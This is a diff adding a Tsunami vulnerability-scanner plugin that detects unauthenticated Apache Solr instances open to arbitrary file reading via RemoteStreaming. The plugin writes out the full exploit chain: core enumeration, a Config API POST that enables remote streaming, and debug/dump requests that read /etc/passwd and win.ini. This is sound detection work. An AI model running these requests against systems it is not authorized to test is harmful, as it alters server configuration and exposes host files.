@@ -1,0 +1,160 @@
+# proto-file: github.com/google/tsunami-security-scanner-plugins/templated/templateddetector/proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "ApacheSolr_RemoteStreaming_ExposedUI"
+  author: "Google"
+  version: "1.0"
+  description: "Detects unauthenticated Apache Solr instances vulnerable to arbitrary file reading via RemoteStreaming and DumpRequestHandler."
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "APACHE_SOLR_REMOTE_STREAMING_FILE_READING"
+  }
+  severity: HIGH
+  title: "Apache Solr RemoteStreaming Arbitrary File Reading"
+  description:
+    "The Apache Solr administrative API is exposed without authentication and"
+    " allows arbitrary local file reading and Server-Side Request Forgery"
+    " (SSRF) through RemoteStreaming (SOLR-14853). An unauthenticated remote"
+    " attacker can enumerate cores via /solr/admin/cores, enable"
+    " requestDispatcher.requestParsers.enableRemoteStreaming via the Config API"
+    " (/solr/<core>/config) on Solr versions prior to 8.11.3 (or exploit"
+    " instances where solr.enableRemoteStreaming is already enabled), and read"
+    " arbitrary host files via /solr/<core>/debug/dump?param=ContentStreams"
+    " using file:// stream URLs."
+  recommendation:
+    "Upgrade Apache Solr to version 8.11.3, 9.0.0, or later so RemoteStreaming"
+    " cannot be enabled via the Config API, ensure solr.enableRemoteStreaming"
+    " remains disabled, enable Solr authentication (security.json), and"
+    " restrict network access to Solr ports."
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "discover_solr_core"
+  action_phase: ACTION_PHASE_FINGERPRINT
+  http_request: {
+    method: GET
+    uri: "/solr/admin/cores?wt=json&indexInfo=false"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"responseHeader\":" },
+          { body: {} contains: "\"status\":" }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            variable_name: "core"
+            regexp: "\"status\"\\s*:\\s*\\{\\s*\"([^\"/\\\\?&#\\s]+)\"\\s*:\\s*\\{"
+            from_body: {}
+          }
+        ]
+      }
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "enable_remote_streaming"
+  cleanup_actions: [
+    "unset_remote_streaming"
+  ]
+  http_request: {
+    method: POST
+    uri: "/solr/{{ core }}/config"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
+    client_options: {
+      disable_follow_redirects: true
+      ignore_http_client_errors: true
+    }
+  }
+}
+
+actions: {
+  name: "unset_remote_streaming"
+  http_request: {
+    method: POST
+    uri: "/solr/{{ core }}/config"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"unset-property\":\"requestDispatcher.requestParsers.enableRemoteStreaming\"}"
+    client_options: {
+      disable_follow_redirects: true
+      ignore_http_client_errors: true
+    }
+  }
+}
+
+actions: {
+  name: "verify_remote_streaming_file_read"
+  http_request: {
+    method: GET
+    uri: [
+      "/solr/{{ core }}/debug/dump?wt=json&param=ContentStreams&stream.url=file:///etc/passwd",
+      "/solr/{{ core }}/debug/dump?wt=json&param=ContentStreams&stream.url=file:///C:/Windows/win.ini",
+      "/solr/{{ core }}/select?qt=/debug/dump&wt=json&param=ContentStreams&stream.url=file:///etc/passwd",
+      "/solr/{{ core }}/select?qt=/debug/dump&wt=json&param=ContentStreams&stream.url=file:///C:/Windows/win.ini"
+    ]
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"streams\":[" },
+          { body: {} contains: "\"sourceInfo\":\"url\"" }
+        ]
+      }
+      extract_any: {
+        patterns: [
+          {
+            variable_name: "leaked_file_marker"
+            regexp: "(root:[x*!]:0:0:|nobody:[x*!]:[0-9]+:)"
+            from_body: {}
+          },
+          {
+            variable_name: "leaked_file_marker"
+            regexp: "(\\[(?:fonts|extensions|mci extensions)\\]|for 16-bit app support)"
+            from_body: {}
+          }
+        ]
+      }
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "discover_solr_core",
+    "enable_remote_streaming",
+    "verify_remote_streaming_file_read"
+  ]
+}
